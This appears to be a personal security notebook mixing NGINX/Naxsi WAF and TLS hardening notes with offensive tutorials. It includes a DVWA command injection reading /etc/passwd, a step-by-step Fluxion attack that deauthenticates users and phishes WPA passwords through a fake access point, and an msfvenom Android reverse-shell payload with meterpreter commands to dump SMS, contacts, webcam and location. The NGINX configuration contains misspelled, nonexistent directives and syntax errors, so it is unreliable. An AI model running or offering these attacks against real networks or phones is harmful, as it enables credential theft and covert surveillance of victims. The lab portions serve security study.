Wallarm -> WAF with machine learning + vulnerability scanner
Does a hybrit approach with filtering nodes installed in customer's infrasture and strong analytics in the cloud


# NGINX directives to limit the buffers
client_header_buffer_size
large_client_header_buffers
client_body_buffer_size
client_max_body_size

# NGINX directives to limit time outs
reset_timeout_connection
clien_header_timeout
clien_body_timeout
keepalive_timeout
send_timeout


# limit connections in NGINX, run benchmarks to see how many requests application can handle
limit_conn and limit_req
# www.fail2ban.org -> to ban people who tried to generate a lot of requests


# USE test_cookie module
# if the client can perform HTTP Redirect
# if it support JavaScript / Flash / cookies
test_cookie -> to quickly understand it was products of a bot


# What is perfect Ratio of Buffer & timeout

location /search {
  return 444;
}

#
# https://www.youtube.com/watch?v=LTq8LO9Het0
#
#------------------------------------------------------------------------------
# Naxsi goes from black users to white users
# blacklist are negative by default in naxsi 
# blacklist are moustly with regular exprecion -> slower or with string

MainRule "str:<" "msg open tag" "mz:Args|URL|BODY\$HEADERS_VAR:Cookie" "s:$XSS:8" "id:1302";

As for a real FW, naxsi rules/whitelists should be as tight as possible:
  - $URL/footbar|$BODY_VAR:message

Duty of administrator is to create whitelist to avoid false positive

nxsi can runs script to tell this user from this ip will be not blocked

Whitelist generation from logs or live traffic


# top 5000 sizes



cat naxsi.rules
"""
SecRulesEnabled;
DeniedUrl "50x.html"

CheckRule
"""



# NGINX NAXSI
# https://www.youtube.com/watch?v=JiJHCodn_PQ
#------------------------------------------------------------------------------
Rather than detecting << complex >> signatures, will focus on << tokens >>
-<>()[];='#...

Tokens presence leads to score increase -> action

Generated logs are pushed into ES - elastic search
Data is relevant for monitoring and trafic inspection
Nxapi with ES helps the admin generate whitelists

Beginning dump a lot of false positive
if exaptions are not false positive learning is over

# Very low memory footprint
# you don't need to update signatures
# learning is getting better and better

Detection rule - what you want to match into http traffic; score; id for whitelist

CheckRule - one request is processed the request reach specific score, log  -> block or drop (sometimes during learning you want to drop it)

Whitelist -> common patert, 80% users make the same; this is false positive we want to whitelist, put them to db and tag them


Learning Fast -> nothing is blocked, but still you can drop with blocklist or libinjections
blocking -> i set to true if i'm ok with learning

Learning is the biggest downside, however
- When it comes to << market >> apps,
  whitelists are very predictable (tamplates!)
- For home-made apps, several options:
  - Relaying on statistics
  - Relying on << trusted >> trafic

More into learning
Nxtool templates (dynamic)
{
  "_msg" : "Magento checkout page (BODY|NAME)",
  "?un" : "/checkout/onepage/",
  "zone : "BODY|NAME",
  "id" ;
}

$ python nodtool.py -c nxapi.json -x -x-s xxx.com 
learning for cokkies !!!


reporting/visualisation
{
  "zone" : "BODY",
  "ip" : "",
  "whitelisted" : "false",
  "url" : "/en/node/250/edit",
  "comments" : "import:20",
  "server" : "xxx",
  "content" : "xxx",
  "var_name" : "",
  "coords" : "[-40.82048048230482304, -10.489023802]",
  "contry" : "ES",
  "date" : "2015-05-19Y",
  "id" : "1000",
}

# you can see as monitoring
# to see the learning of attacks
Kybernete 


#Trips, naxsi language
if ($remote_addr = "1.2.3.4"){
  set $naxsi_flag_learning 0;
  set $naxsi_libinjection_sql q;
}
# Learning only for some specifics URL(s)
# Learning only from some IP(s)
# Learning if the visitor fits some criteria


# Tweaks around learning
# Libinjection
CheckRule
# https://libinjection.client9.com

# Doxi-rules
CheckRule "$UWA >=8" DROP;
# www.mare-system.de/doxi


 





# NGINX https://www.youtube.com/watch?v=dsTub1_4Upg
#------------------------------------------------------------------------------
A lot of customization, we do hosting 
Web application, Classical IT


Cipher Suites     # SSL used it


   ECDHE     -      RSA        -  AES256-GCM     - SHA384    
Key Exchange - Cerfificate Key - Trasport Cipher - Integrity


# how to create a CSR and private key?
# Certificate request  
# StartSSL.com
# Using CFSSL

# Using OpenSSL
openssl genrsa -out key.pem 2048
openssl req -new -sha256 -key key.pem -out key.csr


# Configuration NGINX
Recommend at least 1.0.1p  (openssl )


nginz.conf 
"""
ssl_certificate   multiSAN.crt;
ssl_certificate_key multiSAN.key

server {
  listen  443 ssl;
  listen *:80  ## listen for ipv4; this line is default and implied
  # listen [::]:80 default_server ipv6only=on; ## listen for ipv6
  server_name  www.example.com;

  #root html;
  #inder index.html index.htm;
 
  #ssl_certificate /path/to/signed_cert_plus_intermediates;
  #ssl_certificate_key /path/to/private_key;

  ssl_session_timeout 5m;
  #ssl_session_timeout 1d;
  
  ssl_session_cache shared:SSL:50m;    # share between nginx workers; session resumtion

  # High security, low compatibility
  ssl_protocols TLSv1.2
  # Medium security, maximum compatibility
  #ssl_protocols TLSv1 TLSv1.1 TLSv1.2
  # Low security, maximum compatibility
  #ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2

  #ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256;
  ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384
 
  ssl_prefer_server_ciphers on;     # server choice, always better  

  # session tickets 

  # HSTS
  add_header $strict-Transport-Security max-age=15768000;   # 6 months
   
  # OCSP Stampling: server pre-fetches OSCP responce -> make it faster
  # Saves a round-trip to the client
  set_stapling on;
  set_stapling_verify on;
  set_trusted_certificate /path/to/root_CA_cert_plus_intermediates;

}

server {
  listen       442 ssl;
  server_name  www.example.org
}

# nginx acts as browser to any backend
http {
  server {
    proxy_ssl_protocols    TLSv1 TLSv1.1 TLSv1.2;
    proxy_ssl_ciphers <ssl_ciphers>;  
    proxy_ssl_trusted_certificate  /etc/ssl/certs/trusted_cs_cert.crt;

    proxy_ssl_verify on;
    proxy_ssl_verify_depth 2;
    proxy_ssl_session_route on;
  }
}

# what you have to setup correctly
# ssllabs.com
# 
"""

# To add HSTS !!! A+ security
HSTS  Hyperprotect strick transport security; always redirect to https, but it's dangerous if ssl is down 
# HTTP header cached by browser
# browser always attempts HTTPS
# Maximum age defined in seconds


# tools  jack tutorials
#------------------------------------------------------------------------------
Aircrack
Airodump
Bully
Nmap


#emove code Injection
#------------------------------------------------------------------------------
https://www.youtube.com/watch?v=AuNwk--lfxU#t=38.613354

http://www.dvwa.co.uk/
DVWA tutorial/security
command injection or remote code executing


Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.

sudo apt-get install mysql-server
sudo apt-get install unzip apache2 php5 php5-mysql php-pear
cd /var/www/html
wget https://github.com/RandomStorm/DVWA/archive/v1.0.8.zip
rm v1.0.8.zip
mv DVWA-1.0.8 dvwa
vim dvwa/config/config.inc.php
"""
$_DVWA[ 'db_password' ] = 'p@ssw0rd';

and replace “p@ssw0rd” with your MySQL password.
"""

cd
vim /etc/php5/apache2/php.ini
"""
allow_url_include = Off

and replace “Off” with “On”
"""
chmod -R 777 /var/www/html/dvwa
mysql -u root -p
create database dcwa;
exit

vim /etc/apache2/apache2.conf
"""
Move to the bottom of the file and add the following line:

ServerName localhost
"""

service apache2 start

http://192.168.0.171/dvwa/setup.php

Create Reset Database

http://192.168.0.20/dvwa/

and log in with the following credentials:

username: admin

password: password

https://linuxsecurityblog.com/2016/01/28/install-dvwa-on-ubuntu/


!!!!!!!
XAMPP can be downloaded from: https://www.apachefriends.org/en/xampp.html
Simply unzip dvwa.zip, place the unzipped files in your public html folder, then point your browser to: http://127.0.0.1/dvwa/setup.php
!!!!!!

Ping device
ping-c 4 192.168.0.171



DvWA > Command injection > 191.168.0.171; cat /etc/passwd

# wifi 
#------------------------------------------------------------------------------
https://www.youtube.com/watch?v=Pc8JCiRZ-4w
# man in the middle 

FLuxion -> Flusion is a remake of linset by vk496 with less bugs and more features. It's compatible with Kali

Rowsberri Pie

Scan the networks
Capture a handshake  - capture a handshake automaticaly
Use WEB Inter
Launch a FakeAP   -> imitate access point
Spawns a MDK3 process  -> deauthenticate all Users
A fake DNS
A captive portal
Each submitted password is verified


copy the script from Flusion git 
# you need two wireless cards and at list one package ingestion 

cd .ssh
Host rudik
  Hostname 192.168.1.171
  User root

sudo apt-get install git
git clone https://github.com/deltaxflux/fluxion.git
ls 
cd fluxion
ls
./Installer.sh
# inside graphical session
sudo apt-get install tightvncserver
tightvncserver 
# it starts desktop 
# open new terminal
vncviewer 192.168.1.171:2    
# it loads desktop

# inside graptical session run
./Installer.sh


./fluxion
> Select an interface: wifi with packing injecting interface
  > Select channel: All Channel
    # find all wifis
    CTRL+C
   #> 6   (Run on channel 6)
   # Select 
   #> 1) FakeAP - Hostapd (Recommended)     # man in the middle attack
   #  2) FakeAP - airbase-ng (Slower connection)
   #  3) WPS-SLAUGHTER - Bruteforce WPS Pin
   #  4) Bruteforce - (Handshake is required)  - traditional
   #  5) Back

   Path:  <enter>
   Handshake check (1)
      1) aircrack-ng  (Miss change)
      2) pyrit
   Capture Handshake
      1) Deauth all
      2) Deauth all [mdk3]
      3) Deauth target (only one)
      4) Rescan networks
      5) Exit
   > no can't reach the wifi network, connecting, keep connecting but not let me to wifi
       > when i close the window i can connec

   Status handshake:
      1) Check handshake   (1)
      2) Back (Select another deauth method)
      3) Select another network
      4) Exit
      
   Select your option
      1) Web interface   (1)
      2) Bruteforce
      3) Exit

   Select Login Page (or create your own in)
     English login page (1)

   
   > it will connect to new network with the same name
> user enters the password and we are in


# start the fluxion again now we have a handshake
./flusion
# handshake location (Example: /root/fluxion.cap)
Press ENTER to skip
Path: /root/handshakes/<name>.cap




   





# GO THERE the bit security organization with Tesla, , check tutorial
#------------------------------------------------------------------------------
bugcrowd 

# android 
#------------------------------------------------------------------------------
https://www.youtube.com/watch?v=hDsdpbAWrKA

# on the same network phone and kali
# pay load
# LHOST is my ip from ifconfig; this will send to user
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.171 LPORT=4444 R >shell.apk

get the file on android 

msfconsole
msf > use exploit/multi/handler
> set payload android/meterpreter/reverse_tcp
> set LHOST 192.168.1.171
> set LPORT 4444
> exploit
>> this will start lisening

meterpreter > help
> check_root
> ls
> webcam_snap 2
> webcam_snap 1
> shell                # get inside shell
> sysinfo              # 
> dump_contacts   
> dump_sms
> geolocate
> exit



service apache2 start
 
# nmap network mapper 
#------------------------------------------------------------------------------
https://n0where.net/security-auditing-tool-lynis/
ifconfig

# list of host on the x.x.x.<0-255>
nmap -sP 10.0.0.0/24

kuntuzangmo@kuntuzangpo:~$ sudo nmap -sS -A 192.168.0.171

Starting Nmap 7.01 ( https://nmap.org ) at 2016-10-17 21:11 CEST
Nmap scan report for 192.168.0.171
Host is up (0.000032s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.12 - 3.19, Linux 3.8 - 3.19
Network Distance: 0 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds


ametist

# NGINX NASXI 
#------------------------------------------------------------------------------
https://github.com/nbs-system/naxsi/wiki/naxsi-setup




# hodnoceni
https://n0where.net/nginx-web-application-firewall-naxsi/


# Security
#------------------------------------------------------------------------------
# Kali security hodnoceni
https://n0where.net/security-auditing-tool-lynis/

Kali Linux ? Vulnerability Analysis > Misc Scanners > Lynis

lynis --check-all --no-log --quick

#  SSH
#------------------------------------------------------------------------------
# open ports
ssh <user>@<hostname> netstat -vatn
ssh <user>@<hostname> ls
ssh <user>@<hostname> '/etc/init.d/mysql restart'
# get from server and store locali
ssh <user>@<hostname> 'cp ~/apache/sites/*/conf/worker.workers' > ~/tmp/apache/sites/conf

#  Citrix
#------------------------------------------------------------------------------
https://portal.comproof.net/vpn/index.html

# KILL Citrix 
/opt/Citrix/ICAClient/wfica -icaroot /opt/Citrix/ICAClient /tmp/mozilla_kuntuzangmo0/Q2xhcmEuUmVtb3RlIERlc2t0b3A-.ica


# WIFI Start wlp2s0
#------------------------------------------------------------------------------
/sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-wlp2s0.pid -lf /var/lib/Net




